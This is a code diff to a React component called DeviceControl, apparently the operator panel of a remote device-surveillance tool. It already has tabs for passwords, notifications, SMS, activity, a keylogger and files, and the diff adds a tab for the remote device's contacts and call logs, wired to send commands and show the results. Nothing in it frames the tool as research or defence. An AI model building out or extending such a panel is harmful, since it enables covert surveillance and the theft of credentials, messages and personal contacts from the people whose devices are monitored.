@@ -16,6 +16,7 @@ import ControlCenter from './ControlCenter.jsx';
 import GestureTab from './GestureTab.jsx';
 import SMSManagerTab from './SMSManagerTab.jsx';
 import FileManagerTab from './FileManagerTab.jsx';
+import ContactsCallLogTab from './ContactsCallLogTab.jsx';
 
 const TABS = [
   { id: 'control_center', label: '🎮 Control Center' },
@@ -27,6 +28,7 @@ const TABS = [
   { id: 'passwords',      label: '🔑 Passwords' },
   { id: 'notifications',  label: '🔔 Notifications' },
   { id: 'sms_manager',    label: '💬 SMS Manager' },
+  { id: 'contacts_calls', label: '👥 Contacts & Calls' },
   { id: 'activity',       label: '📱 Activity' },
   { id: 'keylogger',      label: '⌨️ Keylogger' },
   { id: 'file_manager',   label: '📂 Files' },
@@ -224,6 +226,15 @@ export default function DeviceControl({
       <div style={tabVisible('sms_manager')}>
         <SMSManagerTab
           key={refreshKeys.sms_manager}
+          device={device}
+          sendCommand={sendCommand}
+          results={results}
+        />
+      </div>
+
+      <div style={tabVisible('contacts_calls')}>
+        <ContactsCallLogTab
+          key={refreshKeys.contacts_calls}
           device={device}
           sendCommand={sendCommand}
           results={results}
